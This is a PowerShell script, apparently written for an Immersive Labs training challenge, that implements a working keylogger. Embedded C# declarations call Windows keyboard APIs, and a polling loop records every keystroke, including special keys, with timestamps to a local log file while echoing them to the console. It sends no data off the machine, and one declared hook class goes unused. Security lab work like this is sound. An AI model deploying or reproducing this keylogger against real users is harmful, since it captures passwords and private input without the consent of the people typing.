# Windows PowerShell Keylogger for Immersive Lab Challenge
# Captures keyboard input and saves to a log file

# Setup log file
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$logFile = Join-Path $PSScriptRoot "keylog_$timestamp.txt"

Write-Host "[*] Keylogger started" -ForegroundColor Green
Write-Host "[*] Logging to: $logFile" -ForegroundColor Green
Write-Host "[*] Press Ctrl+C to stop`n" -ForegroundColor Yellow

# Add .NET types for keyboard input capture
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern int GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff,
        int cchBuff, uint wFlags);
}
'@ -ReferencedAssemblies System.Windows.Forms

# Create script block for logging
$logAction = {
    param($key, $logPath)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $key" | Add-Content -Path $logPath
}

# Alternative simpler approach using .NET GetAsyncKeyState
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class KeyCapture {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern int GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff,
        int cchBuff, uint wFlags);
}
'@

# Track pressed keys to avoid duplicates
$pressedKeys = @{}

# Main capture loop
try {
    while ($true) {
        Start-Sleep -Milliseconds 10

        # Check keys 0x08 to 0xFE (covers all keyboard keys)
        for ($key = 8; $key -le 254; $key++) {
            $keyState = [KeyCapture]::GetAsyncKeyState($key)

            # Check if key is pressed (most significant bit set)
            if ($keyState -band 0x8000) {

                # Avoid duplicate captures
                if (-not $pressedKeys.ContainsKey($key)) {
                    $pressedKeys[$key] = $true

                    # Get keyboard state
                    $keyboardState = New-Object byte[] 256
                    [void][KeyCapture]::GetKeyboardState($keyboardState)

                    # Convert to character
                    $sb = New-Object System.Text.StringBuilder 64
                    $scanCode = [KeyCapture]::MapVirtualKey($key, 0)
                    $result = [KeyCapture]::ToUnicode($key, $scanCode, $keyboardState, $sb, $sb.Capacity, 0)

                    if ($result -gt 0) {
                        $char = $sb.ToString()
                        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        "$timestamp - Key: $char" | Add-Content -Path $logFile
                        Write-Host $char -NoNewline -ForegroundColor Cyan
                    } else {
                        # Handle special keys
                        $specialKey = switch ($key) {
                            0x08 { "BACKSPACE" }
                            0x09 { "TAB" }
                            0x0D { "ENTER"; Write-Host "" }
                            0x10 { "SHIFT" }
                            0x11 { "CTRL" }
                            0x12 { "ALT" }
                            0x1B { "ESC" }
                            0x20 { "SPACE"; Write-Host " " -NoNewline }
                            0x21 { "PAGE_UP" }
                            0x22 { "PAGE_DOWN" }
                            0x23 { "END" }
                            0x24 { "HOME" }
                            0x25 { "LEFT" }
                            0x26 { "UP" }
                            0x27 { "RIGHT" }
                            0x28 { "DOWN" }
                            0x2D { "INSERT" }
                            0x2E { "DELETE" }
                            default { $null }
                        }

                        if ($specialKey) {
                            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            "$timestamp - Special: $specialKey" | Add-Content -Path $logFile
                            if ($specialKey -ne "SPACE" -and $specialKey -ne "ENTER") {
                                Write-Host "[$specialKey]" -NoNewline -ForegroundColor Yellow
                            }
                        }
                    }
                }
            } else {
                # Key released
                if ($pressedKeys.ContainsKey($key)) {
                    $pressedKeys.Remove($key)
                }
            }
        }
    }
} catch {
    Write-Host "`n[*] Keylogger stopped" -ForegroundColor Red
} finally {
    Write-Host "`n[*] Log saved to: $logFile" -ForegroundColor Green
}
